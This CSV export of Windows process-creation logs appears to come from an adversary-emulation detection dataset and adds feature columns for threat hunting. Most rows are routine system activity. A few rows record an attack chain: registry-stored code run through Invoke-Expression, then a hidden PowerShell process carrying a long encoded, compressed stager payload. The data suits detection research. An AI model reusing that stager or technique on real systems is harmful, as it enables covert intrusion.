ProcessName,SubjectUserName,@timestamp,host,Hostname,EventID,SubjectLogonId,ProcessId,LogonType,TargetLogonId,WorkstationName,IpAddress,TargetUserName,PrivilegeList,CommandLine,ParentProcessName,NewProcessId,NewProcessPath,NewProcessName,ParentProcessNameOnly,suspicious_office_spawn,suspicious_svchost,exit_time,duration_seconds
,SCRANTON$,2020-05-02 03:20:16.060000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0xd8c,,0x0,,,-,,"""FindVolume\FindVolume.exe"" /path \device\Harddisk1\Partition1",C:\WindowsAzure\Packages\GuestAgent\WindowsAzureGuestAgent.exe,0x14ec,"""FindVolume\FindVolume.exe""",findvolume.exe,windowsazureguestagent.exe,False,False,2020-05-02 03:20:16.060000+00:00,0.0
,SCRANTON$,2020-05-02 03:20:16.060000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x14ec,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\WindowsAzure\Packages\GuestAgent\FindVolume\FindVolume.exe,0x14f4,\??\C:\windows\system32\conhost.exe,conhost.exe,findvolume.exe,False,False,2020-05-02 03:20:47.253000+00:00,31.193
,SCRANTON$,2020-05-02 03:20:16.751000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0xd20,,0x0,,,-,,"""route.exe"" print",C:\WindowsAzure\Packages\WaAppAgent.exe,0x1548,"""route.exe""",route.exe,waappagent.exe,False,False,2020-05-02 03:20:17.805000+00:00,1.054
,SCRANTON$,2020-05-02 03:20:17.805000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0xd20,,0x0,,,-,,"""arp.exe"" /a",C:\WindowsAzure\Packages\WaAppAgent.exe,0x157c,"""arp.exe""",arp.exe,waappagent.exe,False,False,2020-05-02 03:20:17.806000+00:00,0.001
,SCRANTON$,2020-05-02 03:20:17.805000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x157c,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\ARP.EXE,0x1584,\??\C:\windows\system32\conhost.exe,conhost.exe,arp.exe,False,False,2020-05-02 03:20:17.806000+00:00,0.001
,SCRANTON$,2020-05-02 03:20:53.885000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x14dc,,0x13069a,,,pbeesly,,C:\windows\system32\userinit.exe,C:\Windows\System32\winlogon.exe,0x1238,C:\windows\system32\userinit.exe,userinit.exe,winlogon.exe,False,False,2020-05-02 03:21:21.018000+00:00,27.133000000000003
,SCRANTON$,2020-05-02 03:20:55.868000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s NgcSvc,C:\Windows\System32\services.exe,0x19a4,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:23:02.319000+00:00,126.45100000000001
,SCRANTON$,2020-05-02 03:20:59.218000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x16d0,,0x0,,,-,,"""cmd""",C:\WindowsAzure\Packages\CollectGuestLogs.exe,0x1b0c,"""cmd""",cmd,collectguestlogs.exe,False,False,2020-05-02 03:21:00.333000+00:00,1.115
,SCRANTON$,2020-05-02 03:20:59.218000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x1b0c,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\cmd.exe,0x1b14,\??\C:\windows\system32\conhost.exe,conhost.exe,cmd.exe,False,False,2020-05-02 03:21:00.334000+00:00,1.116
,SCRANTON$,2020-05-02 03:21:01.815000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:Microsoft.MicrosoftOfficeHub.AppX54h2e8jwdm50fj5ha8987vz1etpx7czd.mca",C:\Windows\System32\svchost.exe,0xe08,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:22:10.993000+00:00,69.178
,SCRANTON$,2020-05-02 03:21:08.297000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",C:\Windows\System32\svchost.exe,0x1e34,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:22:09.719000+00:00,61.422000000000004
,SCRANTON$,2020-05-02 03:21:11.646000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x1444,,0x0,,,-,,"""C:\Program Files (x86)\Google\Update\1.3.35.452\GoogleCrashHandler.exe""",C:\Program Files (x86)\Google\Update\GoogleUpdate.exe,0x1ef0,"""C:\Program",program,googleupdate.exe,False,False,2020-05-02 03:21:14.070000+00:00,2.424
,SCRANTON$,2020-05-02 03:21:11.646000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x1444,,0x0,,,-,,"""C:\Program Files (x86)\Google\Update\1.3.35.452\GoogleCrashHandler64.exe""",C:\Program Files (x86)\Google\Update\GoogleUpdate.exe,0x1ef8,"""C:\Program",program,googleupdate.exe,False,False,2020-05-02 03:21:12.859000+00:00,1.213
,SCRANTON$,2020-05-02 03:21:11.651000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,C:\windows\System32\mobsync.exe -Embedding,C:\Windows\System32\svchost.exe,0x1f04,C:\windows\System32\mobsync.exe,mobsync.exe,svchost.exe,False,False,2020-05-02 03:21:22.151000+00:00,10.5
,SCRANTON$,2020-05-02 03:21:27.764000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x20c0,,0x0,,,-,,consent.exe 8384 306 000001E691026060,C:\Windows\System32\svchost.exe,0x20dc,consent.exe,consent.exe,svchost.exe,False,False,2020-05-02 03:21:31.715000+00:00,3.951
,SCRANTON$,2020-05-02 03:21:31.716000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0xb08,,0x1305dc,,,pbeesly,,"""C:\Windows\System32\hostui.exe"" ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x2104,"""C:\Windows\System32\hostui.exe""",hostui.exe,powershell.exe,False,False,2020-05-02 03:21:31.721000+00:00,0.005
,pbeesly,2020-05-02 03:21:31.717000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x1305dc,0x2104,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\hostui.exe,0x2144,\??\C:\windows\system32\conhost.exe,conhost.exe,hostui.exe,False,False,2020-05-02 03:21:31.721000+00:00,0.004
,SCRANTON$,2020-05-02 03:21:31.721000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2104,,0x13069a,,,pbeesly,,"powershell.exe -c ""Get-ItemPropertyValue 'HKLM:\\SOFTWARE\Javasoft' 'value Supplement' | Invoke-Expression""",C:\Windows\System32\hostui.exe,0x218c,powershell.exe,powershell.exe,hostui.exe,False,False,2020-05-02 03:21:32.215000+00:00,0.49400000000000005
,pbeesly,2020-05-02 03:21:31.721000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x13069a,0x218c,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x21a4,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:21:32.215000+00:00,0.49400000000000005
,pbeesly,2020-05-02 03:21:31.728000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x13069a,0x218c,,0x0,,,-,,"""C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnACcASAA0AHMASQBBAE8ASAA4AFUAMQAwAEMAQQA3AFYAVwBlADIALwBhAFMAQgBEAC8AdQA1AEgAeQBIAGEAdwBLAEMAVgB0AEgAdwBFADUASQBTAGkASgBWAE8AaAB0AHMATQBBAEUAQwBHAEoAdABBAGkAcQBxAE4AdgBkAGkAYgByAEIALwBZAGEAeAA3AHAAOQBiAHYAZgBMAEsAKwBtAGEAbABxADEASgA1ADAARgA4AHUANQA0AG4AcgArAFoAbgBkAGwANQBIAHIAbQBNAHgASgBIAHcAOQBHAEkASwBYADAANQBQADMAdgBWAFIAaQBrAEoAQgBMAEcAeAB1AGgAeQBXAGgANABDADYAawBkACsAKwBBAFcAbABnAHUAVgBlAEcAagBJAEQANgBvAFMAZABLAEkAUQAwAFMAaQAyAGMAMQBOAFAAVQA5AFQASABMAEgAZAB2AHQAegBFAFQATQAwAHkASABEADUAUwBnAGoATgBSAEUAdgA0AFIAeABnAEYATwA4AGQAbgBkADQAeABOADIAbQBmAEIARgBLAEgAdwB1AE4AMgBuADgAaQBPAGkAZQBiAFYATgBIAGIAbwBDAEYATQB6AFgAeQArAEwAZABPADcAQwBMAHUAUwBkAGwASwBLAEcARgBpADgAZABPAG4AbwB2AFIAdwBwAHMAegBLACsAaQBKAEgATgBCAE8ATAAxAGkAWgBqAE8AQwB4ADcAbABCAFkAbAA0AGEAdgBFAEQAWQA0ADIAQwBSAGEATABYAGUASwBtAGMAUgBiAFAAVwBYAGwATQBvAG8AdgB6AHMAaAAxAGwAYQBJADUANwBvAEcAMgBKAHUANQBnAEYAcwBaAGMAVgBKAFEAZwBDAGYAaQBsAG0AZQBSAG8ASgBQAEIAdwB1AHYALwBzAHEARgBtAEgAWgBUADIATgBYADkAYgB3AFUAWgAxAG0AeABKAEQAeAB3AHoAUQArAHoAMgBkAC8AaQB3ADkANwBzAE0ASQA4AFkAQwBYAEgAWgBqAEIAaABPADQAOABUAEMANgBaAEsANABPAEMAdQAzAFUATwBSAFIAUABNAFQAegBHAFUAaABaAEwAQwBXAFIAUAA1AE0AawBZAEYAdgBHAHoAMQBnAHMAUgBEAG0AbABKAGUARgBQADEASQBnADkAdgBEAHEAQQA5AHIAdABDADQAbQBzAGgANABPAHEAegBWAEMAcABCAEUAbgA4AE0AcwB4AHQANwBPAGMAVQA3AHcAZQBJAGIAZgB2AEsAOABTAC8ARABzAGMAZwArAG8AZgBUADAAOQBPAFQAMgBaAEgANgBwAGsATQAzAHAAZABKAEwAQgA2ADkANwBCAGQAWQAzAEIATQA3AE0AYwBaADIAWABKADkARgBPAFMAUwAwAEEAVQBiAGkATQBYAHAAQgByAGEARgBVAFoAcABqAGEAWABhAEUAVgBTAGoAawA3AGQATABQAHAAWgBVAEQASwB6AEQARwBzAHYATABaAEEAdABxAEQARQB4AE4AdgBCAGoATAA3AFQAQgBiAG8AawBsAE4ALwBYAG8AOABOAFAAQwBjAFIAYgBtAHcAaQBGAEIATAAzAFUASABMAGkAVwArAGoAaQBPAGMAWABiADgATQBvAEgAdABoADcANABKAEIAYgAzAEgANwBEAFgAdwBCAFQANwBpAEgASABBAGUASgBKAC8ARQBOAE4ARAB3AG8ANgB5AFcAawA2AG8AaAAxAFAAVgBoAFEAeABsADQAQgBVAGsAVAAvAHIAZQBtAFYAMABPAHgASwBJAFoAZABYAEUASQBBAE8AMwAyAFUASABXAEYATwBSAFEANgBQAG4ARAB2AGkAMwB0AHoAcwBNADcAMwB3AEYAUwBzAFUANQBSAGwASgBhAEcAZgB3ADAAbAB6AFMANABLAEYARQBjAFYAZQBTAFYAQwBqAGoATwB3AC8AcQBUAG0ATAB0ADgAdgBpAE4AMwBlADcATwBXAFgARQBSAFIAawA3AHEASgB0AEoATwB4AFQAMwAxAHUAcAB4AGwATABFADAAZAB5AEYAagBFAFAAbgBJAFMAcgBCAEwARQBPAFYAQQBsAEkAUQBXADgAYgBDADIAcwBZAGgALwBzAEYAcAA4AEUANABZADYAbwBoAFQASwBIAHoAUQB0AEkAUQAxAEEANABlAEYAYgBqAE4AZABCAEMAZwA1AEMAegBxAFcAeQBoAFoAawBaAEoAaABTAEgAdwBMAEUAOQA3AGcAWgBGAFAAaAB6AHUAZgBZAGwAdgB5AHcAYgA1ADIAQwB0ACsANwA5ADIAaABnAG4AZgBsAHkAbABFADQAaABQAC8ASwBOADAAaQB0AFIAVwBOAFcARQBoAHkAUwBNAHUAZwBaAEgATgBGAHQAKwBmAHcAWAAyADYAKwBhAEIAWABoAFIAVAAvAEUAKwBBACsATABoAFQARAB4AG8ARwA4AFoAcgB1AFUAQgBRAEwAVQBwADUATABlADQAUgAyAGMAYQBmAE0AbwBqAGQAUwBPAE4AUQBRAHgAbQArAHEAdQA0AGEAZwAvAGkAKwBvAHAAUABHAFoAYgA4AFIAdgA2AGoAdwA2AE0AWgB3ADQARwBpAFcANwBVAHoATgByAHQAZQBtAGwAcwBtAHMAaQBVADQANgBkAGgAQwBZAFIARABGADkAMgBHADkAcwAzAGUAOAB6AE8AYgBrAGQAagBWAHAAdABxADkARgBTADAAOABZADYAbQBLAHQAbQBaAHUAbwB0AGIAVABOAFEATgBOAFYAdABrAFEAOQBPAFcANwBOAHQAawBDAFAAMQB6AHUAQgBwAGIAYQBxAGUARgB2AHIAMwAvAHEAUwArAE0AdgB2AEIAdgBRAG0ARwA2AGgAMwBmADkATwBHAHQAbQBZAEcAcgB5AFYAUABaADEAMgBTAGoAMwByAEcAMABRAEMAZQB5ADYAbAB1AEQAMQBxAEMAcQBUAE0AMQBLAGoAVwByAGsAeABUAEkAdAB0AFQAVQArADIAagB2AGEAMABhAHYAVgAxAHYAMQA2AHAAUABhADYAYgBUAFUAdwA3AGoAeABEAE8AVABlADIAOABzADkAYwBmAHYAcgBjADcARABUADAANwBkADcAbAArADgARQBrADAANABrAE8AZABuAFIAagBNAG4AQQBDAFAASABZAFMAYgBhAHcAYgAwADQARwBUAG0AUAA1AGYASwAzAC8AZwBkAEMAcABWAEkAOQBDAEEAYgBwAEoAMQBKADcARQBxADgAQwBnAEsANABNAEIARwAxAHUAUABsAEIAUgBwAGYASgBvACsAaABJAHcATgBHAFkAOAB1AE0AQQBzAHUAZAAxADAAYwB0AE4AOQBRAHEARgBjAGQAVwBlAGkAYgBCAHgAbQBqADgATABLADkAWAB1AHIAegBlAE8ARAAyAFEAaQBhACsAYwBLAEkAdwA0AHIARwBxAC8ANABsAHkAcABLADcANQBhADMANAAzAE0AdgBEAHUAYQBWAEQAdABQAGEAdAA1AFQATgBRAFMANgBOAE4AQwBsADUAaQBzAGQAOABOAC8ASgBJAHAALwBMAEoALwBkAGsAVwBtAGsAZQA1AFIAcwAxAHYAbABwADYAegArAHYANgA0ADIAZwBnAFQAdwAyADMAYQBvAGQAVABOAHIAaAB3AG4AcQB4ADcAZQA0ADMATwA5AFgAUAB2AHAAVwBkADIAbQA4AHkAZQBqAGgAeQA3ACsAMABKAEQAUwAxAGQAUQA3AHoAegBRAGUAMABaAHQAMAB3AHUAaABiADQAUwAyAGIARAB2AFgAZwB6AHQANwBPAE0ASgBHADkAdwBJADkARABhAHMAVABYAHoATwBKAHkAMwAwADMASgBoAHgAagBXAHkAWgBWAHQAWABIAHIAQgAxAHYARAAyAGcAQgBpAGEANgA5AHIAbgBkAFMAeABxAGgAOABxADEAdwA3AHcAVABoAGQAMQBlAG0AMgBTAHUAYgBGAG8ASwBZAG0ARgBUAEIAVgBLAFIAMgBzAFQAcgBDADAAMAB3AEIAUAA4AFYAbwBiAEoAMQBkAEYAdgAwAEsAbgBhAFMAcwBMADUAZQAxADIAWAA4AHYALwBJAGwAcQBQAFcAaQBzAGoATgBaAG0AdABaAFUAUwBiADMAcQBqAGUAOABOAHQAZQAxAHAAcQBrAEQAUgBDAEMAdgAxAHgAcgAzAC8AawBIAGUANgBsAGYANgBuAHQAcABKAEYAMwBuAGcAYwBKAEsAdAAwAE0AWABBAFMATgByAEUAYQAyAG4AVgBRAEEAUABmAEEARABaADEASwB6AGQASgBqAEQANAA5AHkAcgBWADcAWQBJAGUAMABMACsARgBmAHMAMABuADcALwBCAGwAcwBxAHEAcQAvADkAWABWAE8AMgAzAGwAdwBPAHkAYgBZADMATABMAHoAdQBQAHoAYQB3AE8AZQAxAG0ASQBXAG8AbwAwAEUAOQByAHEAcgBnAGwAOQBlAGUAcgBKAFIAZwBvAFIAcQBVAFkANwBCAGkAcQBEADIAdQBYAE4AcwBmADMALwBQAGoAQwBPAGUAeAA0AEcARwA1AFEAMQA4AGQAdABKACsATgB4AFMANQBLAHMAdwBCAFIATwBJAEEAdwA4AEEANwB0AHoAbwBoAFQAWQB6AC8ARgArAGoASABoAEUAcQBMAEkANwB6AHoAUABPAEkAMAB3AGgAVgBzAEQAMwBDAHMATwBqAFUATwBsAE4ASABiADUAQQBJAFYAeABCADYATgA3AE4AMQBEADUAZgBMAGQAaABlAFgASAArADUAawBvAFMAagBvAHoAUwB0ADcAbAA2AEkATgAzAGMAVABNAEYARgA2AEUAUABiAFoAbABIAHUANABNAGgAbgBRAFUAbABlAFgAOABnAHkAagBFAHAANQBYAFoAVQBoAHkATgArAFAAcQB4ADQAbgBHADMARwBuAHEAOABSAG4ANwBRADYAYQBvADMAcQA2AFYAUwAvAHgATABsAFcAWQB0ADYANAAvAC8ASwArAFkANwBWAHQAagBBAEMALwB2ADEANQBoADkAbwAvADMAaQA2ADIALwBoAEsASgBmADIARQBmADkAQQAvADUANwB3AFIANgBEACsAYQBlAEIAagBSAEIAZwB3AFcAdABEAFkASwBkADUAZABLAGQANgBLAGYAMQA4AGUAcgArADUAYQBQAEMAVwBRACsALwBuACsANABWAGYAbAB1ADUAeQBkADkAZQBBAEsAZABuAHIAeQBMAC8AdwBMAHYAcwAyAFIAQwB3AEEAQQAnACcAKQApACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA=",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x2200,"""C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe""",powershell.exe,powershell.exe,False,False,2020-05-02 03:21:32.215000+00:00,0.48700000000000004
,SCRANTON$,2020-05-02 03:21:50.078000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x498,,0x0,,,-,,C:\windows\System32\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2),C:\Windows\System32\svchost.exe,0x2340,C:\windows\System32\dsregcmd.exe,dsregcmd.exe,svchost.exe,False,False,2020-05-02 03:21:50.101000+00:00,0.023000000000000003
,SCRANTON$,2020-05-02 03:21:50.078000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2340,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\dsregcmd.exe,0x2348,\??\C:\windows\system32\conhost.exe,conhost.exe,dsregcmd.exe,False,False,2020-05-02 03:21:50.103000+00:00,0.025
,SCRANTON$,2020-05-02 03:21:55.931000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x498,,0x1305dc,,,pbeesly,,taskhostw.exe $(Arg0),C:\Windows\System32\svchost.exe,0x2394,taskhostw.exe,taskhostw.exe,svchost.exe,False,False,2020-05-02 03:21:55.935000+00:00,0.004
,NASHUA$,2020-05-02 03:21:55.982000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x3e4,,,NASHUA$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x22c8,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:24:04.126000+00:00,128.144
,NASHUA$,2020-05-02 03:22:02.034000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x2d0,,0x3e4,,,NASHUA$,,C:\windows\system32\sppsvc.exe,C:\Windows\System32\services.exe,0x2320,C:\windows\system32\sppsvc.exe,sppsvc.exe,services.exe,False,False,2020-05-02 03:22:33.654000+00:00,31.62
,SCRANTON$,2020-05-02 03:22:12.166000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x498,,0x0,,,-,,C:\windows\system32\sc.exe start pushtoinstall registration,C:\Windows\System32\svchost.exe,0x23cc,C:\windows\system32\sc.exe,sc.exe,svchost.exe,False,False,2020-05-02 03:22:13.196000+00:00,1.03
,SCRANTON$,2020-05-02 03:22:12.167000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x23cc,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\sc.exe,0x23d4,\??\C:\windows\system32\conhost.exe,conhost.exe,sc.exe,False,False,2020-05-02 03:22:13.196000+00:00,1.0290000000000001
,SCRANTON$,2020-05-02 03:22:13.202000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x498,,0x0,,,-,,C:\windows\system32\wermgr.exe -upload,C:\Windows\System32\svchost.exe,0x126c,C:\windows\system32\wermgr.exe,wermgr.exe,svchost.exe,False,False,2020-05-02 03:22:13.362000+00:00,0.16
,UTICA$,2020-05-02 03:22:30.609000+00:00,wec.internal.cloudapp.net,UTICA.dmevals.local,4688,0x3e7,0x384,,0x3e4,,,UTICA$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x1258,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:24:09.175000+00:00,98.566
,NASHUA$,2020-05-02 03:22:33.646000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0xd5c,,0x0,,,-,,"""CollectGuestLogs.exe"" -Mode:ga -FileName:C:\WindowsAzure\CollectGuestLogsTemp\605ef5d6-0443-40c0-96ab-f749fc507ad0.zip",C:\WindowsAzure\Packages\WaAppAgent.exe,0x20f0,"""CollectGuestLogs.exe""",collectguestlogs.exe,waappagent.exe,False,False,2020-05-02 03:23:03.332000+00:00,29.686000000000003
,NASHUA$,2020-05-02 03:22:33.646000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x20f0,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\WindowsAzure\Packages\CollectGuestLogs.exe,0x1e68,\??\C:\windows\system32\conhost.exe,conhost.exe,collectguestlogs.exe,False,False,2020-05-02 03:23:03.333000+00:00,29.687
,UTICA$,2020-05-02 03:22:35.767000+00:00,wec.internal.cloudapp.net,UTICA.dmevals.local,4688,0x3e7,0x2d8,,0x3e4,,,UTICA$,,C:\windows\system32\sppsvc.exe,C:\Windows\System32\services.exe,0x7c4,C:\windows\system32\sppsvc.exe,sppsvc.exe,services.exe,False,False,2020-05-02 03:23:07.363000+00:00,31.596000000000004
,NASHUA$,2020-05-02 03:22:42.891000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x20f0,,0x0,,,-,,"""cmd""",C:\WindowsAzure\Packages\CollectGuestLogs.exe,0x1b50,"""cmd""",cmd,collectguestlogs.exe,False,False,2020-05-02 03:22:43.886000+00:00,0.9950000000000001
,NASHUA$,2020-05-02 03:22:42.891000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x1b50,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\cmd.exe,0x1578,\??\C:\windows\system32\conhost.exe,conhost.exe,cmd.exe,False,False,2020-05-02 03:22:43.886000+00:00,0.9950000000000001
,SCRANTON$,2020-05-02 03:22:51.096000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",C:\Windows\System32\svchost.exe,0x1124,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:23:51.981000+00:00,60.885000000000005
